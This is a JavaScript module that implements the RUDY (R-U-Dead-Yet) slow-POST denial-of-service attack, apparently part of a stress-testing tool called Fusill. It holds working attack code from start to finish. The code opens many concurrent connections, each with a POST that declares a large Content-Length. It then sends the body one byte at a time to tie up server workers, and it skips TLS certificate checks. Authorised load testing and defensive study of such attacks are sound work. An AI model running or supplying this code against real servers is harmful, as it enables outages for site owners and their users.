/**
 * R-U-Dead-Yet? (RUDY)
 *
 * Sends a legitimate POST with a large Content-Length, then drips
 * the body one byte at a time. The server holds a worker open waiting
 * for the full body — exhausts thread-per-connection servers (Apache prefork).
 */

import net from 'net';
import tls from 'tls';
import { URL } from 'url';

export async function runRudy(target, config, durationSeconds) {
  const {
    concurrent_connections = 50,
    content_length         = 1_000_000,
    byte_interval_ms       = 5_000,
  } = config;

  const url     = new URL(target.startsWith('http') ? target : `http://${target}`);
  const isHttps = url.protocol === 'https:';
  const host    = url.hostname;
  const port    = parseInt(url.port) || (isHttps ? 443 : 80);
  const path    = url.pathname + url.search;

  const endTime = Date.now() + durationSeconds * 1000;
  let opened = 0, closed = 0;

  function openConnection() {
    return new Promise((resolve) => {
      const opts = { host, port, rejectUnauthorized: false };
      const sock = isHttps ? tls.connect(opts, onConnect) : net.connect(opts, onConnect);

      sock.on('error', () => resolve());

      function onConnect() {
        opened++;

        // Complete headers — server accepts the request and waits for the body
        sock.write(
          `POST ${path} HTTP/1.1\r\n` +
          `Host: ${host}\r\n` +
          `User-Agent: Fusill/1.0\r\n` +
          `Content-Type: application/x-www-form-urlencoded\r\n` +
          `Content-Length: ${content_length}\r\n` +
          `Connection: keep-alive\r\n` +
          `\r\n`
        );

        let sent = 0;

        const interval = setInterval(() => {
          if (Date.now() >= endTime || sock.destroyed || sent >= content_length) {
            clearInterval(interval);
            sock.destroy();
            resolve();
            return;
          }
          sock.write('X');
          sent++;
        }, byte_interval_ms);

        const cleanup = () => { clearInterval(interval); closed++; resolve(); };
        sock.on('error', cleanup);
        sock.on('close', cleanup);
      }
    });
  }

  await Promise.all(Array.from({ length: concurrent_connections }, openConnection));

  return {
    avgLatencyMs      : 0,
    errorRateBps      : opened > 0 ? Math.round((closed / opened) * 10000) : 10_000,
    requestsCompleted : opened,
  };
}
